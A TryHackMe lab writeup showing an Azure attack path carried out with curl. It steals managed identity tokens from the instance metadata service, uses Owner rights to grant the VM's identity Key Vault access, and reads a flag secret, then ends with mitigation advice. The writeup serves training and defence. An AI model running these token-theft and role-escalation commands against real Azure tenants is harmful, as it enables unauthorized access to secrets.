

# Azure: Eyes Wide Shut - TryHackMe Writeup

**Difficulty:** Medium | **Focus:** Cloud Security, Azure RBAC, Managed Identities, REST API

## 🎯 Objective

This writeup details the attack path for the "Azure: Eyes Wide Shut" lab. The objective is to move laterally from a compromised Azure Linux Virtual Machine with limited visibility, exploit Managed Identity misconfigurations, and exfiltrate a sensitive flag stored in an Azure Key Vault.

Since the Azure CLI (`az`) is not installed on the target machine, the entire enumeration and exploitation process is conducted using `curl` against the Azure REST API (Living off the Land).

---

## ⛓️ Attack Path Walkthrough

### 1. Initial Access & Identity Theft (IMDS)

After gaining initial SSH access to the `LinuxVM` using compromised credentials, the first step is to check if the virtual machine has a System-Assigned Managed Identity. We query the local Azure Instance Metadata Service (IMDS) at `169.254.169.254` to extract OAuth2 access tokens.

We extract two tokens: one for the Azure Resource Manager (ARM) and one for Azure Key Vault.

```bash
# Extract ARM Management Token
ACCESS_TOKEN=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq -r .access_token)

# Extract Key Vault Token
KV_TOKEN=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" | jq -r .access_token)

```

### 2. Cloud Reconnaissance

Using the ARM token, we enumerate the resources within the subscription to map the environment and identify our target.

```bash
curl -s -X GET -H "Authorization: Bearer $ACCESS_TOKEN" \
"https://management.azure.com/subscriptions/1746294a-5aa8-4cbb-82a4-11e731b20942/resources?api-version=2021-04-01" | python3 -m json.tool

```

**Key Findings:**

* Discovered a target Key Vault named `akv-03156915`.
* Identified the `principalId` of our compromised VM: `90a3b371-4ef5-466a-a952-4b5e8e0e28fd`.

### 3. The RBAC Wall & Enumeration

Attempting to read the secrets directly using the `$KV_TOKEN` results in a `ForbiddenByRbac` error. While the identity is recognized, it lacks Data Plane permissions to read vault secrets.

To understand our privileges, we query the Role Assignments for the Resource Group:

```bash
curl -s -X GET -H "Authorization: Bearer $ACCESS_TOKEN" \
"https://management.azure.com/subscriptions/1746294a-5aa8-4cbb-82a4-11e731b20942/resourceGroups/rg-03156915/providers/Microsoft.Authorization/roleAssignments?api-version=2015-07-01" | python3 -m json.tool

```

Reviewing the output, we find our VM's `principalId` is assigned to a specific role definition (`8e3af657-a8ff-443c-a75c-2fe8c4bcb635`). Querying this Role Definition ID via the API reveals it is the **Owner** role.

### 4. Privilege Escalation (Management Plane to Data Plane)

This highlights a critical cloud security misconfiguration: **Over-privileged Managed Identities**.
While the 'Owner' role grants full control over the Management Plane (ability to modify resources and access policies), it does not implicitly grant Data Plane access (ability to read secrets).

However, as an Owner, we possess the `Microsoft.Authorization/roleAssignments/write` permission. We can exploit this to grant ourselves the required Data Plane permissions.

We generate a new GUID and send a `PUT` request to assign the **Key Vault Secrets User** role (`4633458b-17de-408a-b874-0445c86b69e6`) to our VM's identity.

```bash
# Generate a unique GUID for the new role assignment
NEW_GUID=$(cat /proc/sys/kernel/random/uuid)

# Inject the new role assignment via REST API
curl -s -X PUT -H "Authorization: Bearer $ACCESS_TOKEN" -H "Content-Type: application/json" \
"https://management.azure.com/subscriptions/1746294a-5aa8-4cbb-82a4-11e731b20942/resourceGroups/rg-03156915/providers/Microsoft.KeyVault/vaults/akv-03156915/providers/Microsoft.Authorization/roleAssignments/$NEW_GUID?api-version=2022-04-01" \
-d '{
  "properties": {
    "roleDefinitionId": "/subscriptions/1746294a-5aa8-4cbb-82a4-11e731b20942/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6",
    "principalId": "90a3b371-4ef5-466a-a952-4b5e8e0e28fd"
  }
}' | python3 -m json.tool

```

### 5. Data Exfiltration

After allowing a brief moment for the Azure RBAC changes to propagate, we re-query the Key Vault for the specific secret named `flag`.

```bash
curl -s -X GET -H "Authorization: Bearer $KV_TOKEN" \
"https://akv-03156915.vault.azure.net/secrets/flag?api-version=7.4" | python3 -m json.tool

```

**Result:**

```json
{
    "value": "THM{323b2ca1-a032-490e-9059-325a4e839899}"
}

```

The environment is fully compromised, and the target data is successfully extracted.

---

## 🛡️ Mitigation & Defense

To prevent this attack path, cloud administrators should enforce the **Principle of Least Privilege**:

1. Never assign broad management roles (e.g., `Owner` or `Contributor`) to virtual machines unless strictly required for specific automation tasks.
2. Utilize custom roles with granular permissions tailored strictly to the VM's functional requirements.
3. Monitor and audit Azure Activity Logs for unexpected `Microsoft.Authorization/roleAssignments/write` operations initiated by Service Principals or Managed Identities.
